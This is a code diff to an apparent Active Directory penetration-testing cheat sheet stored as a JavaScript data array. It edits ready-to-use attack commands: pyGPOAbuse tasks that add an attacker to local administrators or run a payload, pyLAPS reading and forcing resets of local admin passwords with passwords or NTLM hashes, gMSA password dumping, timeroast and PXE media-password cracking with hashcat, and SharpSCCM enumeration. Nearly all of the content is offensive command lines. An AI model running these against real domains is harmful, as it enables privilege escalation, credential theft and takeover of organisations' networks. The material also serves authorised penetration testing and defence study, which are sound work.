@@ -2522,11 +2522,11 @@ var TOOLKIT = [
               "quickReference": [
                       {
                               "label": "Add an immediate task",
-                              "cmd": "pygpoabuse.py <domain>/<user>:'<pass>' -gpo-id '<GPO-GUID>' --command 'net localgroup administrators <you> /add'"
+                              "cmd": "pygpoabuse.py <domain>/<user>:'<pass>' -gpo-id '<GPO-GUID>' -command 'net localgroup administrators <you> /add'"
                       },
                       {
                               "label": "With a hash",
-                              "cmd": "pygpoabuse.py <domain>/<user> -hashes :<nthash> -gpo-id '<GUID>' --command '<cmd>'"
+                              "cmd": "pygpoabuse.py <domain>/<user> -hashes :<nthash> -gpo-id '<GUID>' -command '<cmd>'"
                       }
               ],
               "sections": [
@@ -2536,7 +2536,7 @@ var TOOLKIT = [
                               "commands": [
                                       {
                                               "label": "Inject the task",
-                                              "cmd": "pygpoabuse.py <domain>/<user>:'<pass>' -gpo-id '<GPO-GUID>' \\\n  --command 'cmd.exe' --arguments '/c <payload>'"
+                                              "cmd": "pygpoabuse.py <domain>/<user>:'<pass>' -gpo-id '<GPO-GUID>' \\\n  -command 'cmd.exe /c <payload>'"
                                       },
                                       {
                                               "label": "Find the GPO GUID first",
@@ -2580,8 +2580,8 @@ var TOOLKIT = [
                               "cmd": "pyLAPS.py --action get -d <domain> -u <user> -p '<pass>'"
                       },
                       {
-                              "label": "Target one computer",
-                              "cmd": "pyLAPS.py --action get -d <domain> -u <user> -p '<pass>' --computer <host>"
+                              "label": "Authenticate with a hash",
+                              "cmd": "pyLAPS.py --action get -d <domain> -u <user> -H <nthash>"
                       },
                       {
                               "label": "Also works via NetExec",
@@ -2599,7 +2599,7 @@ var TOOLKIT = [
                                       },
                                       {
                                               "label": "Reset a LAPS password (force rotation)",
-                                              "cmd": "pyLAPS.py --action set -d <domain> -u <user> -p '<pass>' --computer <host>"
+                                              "cmd": "pyLAPS.py --action set -d <domain> -u <user> -p '<pass>'"
                                       },
                                       {
                                               "label": "Then log in as local admin",
@@ -2644,7 +2644,7 @@ var TOOLKIT = [
                       },
                       {
                               "label": "With a hash",
-                              "cmd": "gMSADumper.py -u <user> -p :<nthash> -d <domain>"
+                              "cmd": "nxc ldap <dc_ip> -u <user> -H <nthash> --gmsa"
                       },
                       {
                               "label": "Via NetExec",
@@ -2765,8 +2765,8 @@ var TOOLKIT = [
                               "cmd": "hashcat -m 31300 timeroast.txt wordlist.txt"
                       },
                       {
-                              "label": "Target a RID range",
-                              "cmd": "timeroast.py <dc_ip> -a <rid_low> -b <rid_high>"
+                              "label": "See all options",
+                              "cmd": "timeroast.py -h   # list all supported options"
                       }
               ],
               "sections": [
@@ -3017,7 +3017,7 @@ var TOOLKIT = [
                               "commands": [
                                       {
                                               "label": "Map the site and its objects",
-                                              "cmd": "SharpSCCM.exe get devices -sms <SMS_PROVIDER>\nSharpSCCM.exe get collections\nSharpSCCM.exe get site-info"
+                                              "cmd": "SharpSCCM.exe get devices -sms <SMS_PROVIDER>\nSharpSCCM.exe get collections\nSharpSCCM.exe get primary-users"
                                       }
                               ]
                       },
@@ -3145,8 +3145,8 @@ var TOOLKIT = [
                               "cmd": "pxethief.py 2 <dp_ip>"
                       },
                       {
-                              "label": "Crack a set boot password",
-                              "cmd": "hashcat -m 19850 pxe.hash wordlist.txt"
+                              "label": "Crack a set media password",
+                              "cmd": "# if a boot-media password is set, crack the recovered hash with hashcat (see PXEThief README)"
                       },
                       {
                               "label": "List modes",
@@ -3164,7 +3164,7 @@ var TOOLKIT = [
                                       },
                                       {
                                               "label": "Crack the media password",
-                                              "cmd": "hashcat -m 19850 pxe.hash /usr/share/wordlists/rockyou.txt"
+                                              "cmd": "# crack the recovered media-password hash with hashcat (mode per the PXEThief README)"
                                       }
                               ]
                       },
